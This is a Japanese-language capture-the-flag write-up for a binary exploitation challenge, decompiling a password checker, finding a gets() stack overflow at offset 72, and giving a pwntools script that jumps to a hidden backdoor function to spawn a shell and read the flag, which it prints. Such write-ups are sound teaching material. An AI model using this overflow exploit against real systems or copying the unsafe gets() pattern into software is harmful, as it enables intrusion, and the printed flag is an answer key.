# Writeup

実行ファイルが与えられる。

```bash
$ file password_checker
password_checker: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=ec969a4c424dcdcec87e33a5f3ef64828de8d006, for GNU/Linux 3.2.0, not stripped
```

Ghidraで解析してみる。

```c
void password_checker(void)

{
  undefined8 local_a8;
  undefined local_a0;
  char local_78 [48];
  char local_48 [60];
  int local_c;
  
  printf("Enter the password to get in: \n>");
  gets(local_48);
  strcpy(local_78,local_48);
  local_a8 = 0x64726f7773736170;
  local_a0 = 0;
  local_c = strcmp(local_78,(char *)&local_a8);
  if (local_c == 0) {
    printf("You got in!!!!");
  }
  else {
    printf("This is not the password");
  }
  return;
}
```

とりあえず`password`と入力すればif文の中に入るが、何も起きない。

```bash
$ ./password_checker
Enter the password to get in:
>password
You got in!!!!%
```

他の関数を調べると、`backdoor`という関数があり、ここへ飛ばせば良さそうだということが分かった。

```c
void backdoor(void)

{
  system("/bin/sh");
  return;
}
```

`gets`関数でBOFができそうなので、`gdb-peda`を使って`RSP`を書き換えるためのoffsetを調べる。

```bash
gdb-peda$ patto IAAeAA4AAJAAfAA5AAKAAgAA6AAL
IAAeAA4AAJAAfAA5AAKAAgAA6AAL found at offset: 72
```

```py
from pwn import *

e = ELF('password_checker')
io = remote('pwn.chal.csaw.io', 5000)
io.recvuntil('>')

offset = b'a' * 72
payload = offset + p64(e.symbols['backdoor'])
io.sendline(payload)
io.interactive()
```

`backdoor`関数に飛んで、`/bin/sh`が実行されたのでフラグを調べる。

```bash
This is not the password
$ ls
flag.txt
password_checker
$ cat flag.txt
flag{ch4r1i3_4ppr3ci4t35_y0u_f0r_y0ur_h31p}
```

<!-- flag{ch4r1i3_4ppr3ci4t35_y0u_f0r_y0ur_h31p} -->

